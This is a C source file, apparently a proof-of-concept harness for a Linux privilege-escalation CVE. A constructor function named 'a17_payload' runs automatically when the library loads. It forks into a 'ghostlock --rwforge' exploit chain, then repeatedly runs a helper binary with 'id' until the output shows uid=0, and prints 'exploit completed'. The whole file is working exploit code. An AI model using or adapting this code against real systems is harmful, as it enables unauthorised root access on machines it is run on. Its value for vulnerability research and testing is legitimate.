#define _GNU_SOURCE

#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int g4_cli_main(int argc, char **argv);

static int root_helper_id(const char *helper, char *proof, size_t proof_size) {
  int pair[2];
  if (pipe(pair) != 0)
    return 0;
  pid_t child = fork();
  if (child < 0) {
    close(pair[0]);
    close(pair[1]);
    return 0;
  }
  if (child == 0) {
    dup2(pair[1], STDOUT_FILENO);
    dup2(pair[1], STDERR_FILENO);
    close(pair[0]);
    close(pair[1]);
    execl(helper, helper, "-c", "id", (char *)NULL);
    _exit(127);
  }
  close(pair[1]);
  ssize_t total = 0;
  while ((size_t)total + 1 < proof_size) {
    ssize_t got = read(pair[0], proof + total, proof_size - 1 - total);
    if (got < 0 && errno == EINTR)
      continue;
    if (got <= 0)
      break;
    total += got;
  }
  proof[total] = 0;
  close(pair[0]);
  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
  return WIFEXITED(status) && WEXITSTATUS(status) == 0 &&
         strstr(proof, "uid=0") != NULL;
}

static int configure_home(const char *helper) {
  char home[PATH_MAX];
  size_t length = strlen(helper);
  if (length >= sizeof(home))
    return 0;
  memcpy(home, helper, length + 1);
  char *slash = strrchr(home, '/');
  if (!slash || slash == home)
    return 0;
  *slash = 0;
  return setenv("G4_HOME", home, 1) == 0;
}

__attribute__((constructor)) static void a17_payload(void) {
  static int started;
  if (started)
    return;
  started = 1;
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || !helper[0] || access(helper, X_OK) != 0 ||
      !configure_home(helper)) {
    fprintf(stderr, "A17_APP_FAIL root helper errno=%d %s\n", errno,
            strerror(errno));
    _exit(1);
  }
  setenv("GL_WQ_UMH", "1", 1);

  pid_t chain = fork();
  if (chain < 0) {
    fprintf(stderr, "A17_APP_FAIL fork errno=%d %s\n", errno,
            strerror(errno));
    _exit(1);
  }
  if (chain == 0) {
    char *argv[] = {(char *)"ghostlock", (char *)"--rwforge", NULL};
    _exit(g4_cli_main(2, argv));
  }
  printf("A17_APP_START uid=%d euid=%d pid=%d chain=%d\n", getuid(),
         geteuid(), getpid(), chain);

  int status = 0;
  while (waitpid(chain, &status, 0) < 0 && errno == EINTR) {}
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
    fprintf(stderr, "A17_APP_FAIL chain status=%d\n", status);
    _exit(1);
  }

  char proof[512] = {0};
  int rooted = 0;
  for (int attempt = 0; attempt < 50; ++attempt) {
    if (root_helper_id(helper, proof, sizeof(proof))) {
      rooted = 1;
      break;
    }
    usleep(100000);
  }
  if (!rooted) {
    fprintf(stderr, "A17_APP_FAIL root proof=%s\n", proof);
    _exit(1);
  }
  printf("A17_APP_ROOT_PROOF %s", proof);
  if (!strchr(proof, '\n'))
    putchar('\n');
  printf("done=1 root=1\nexploit completed\n");
}
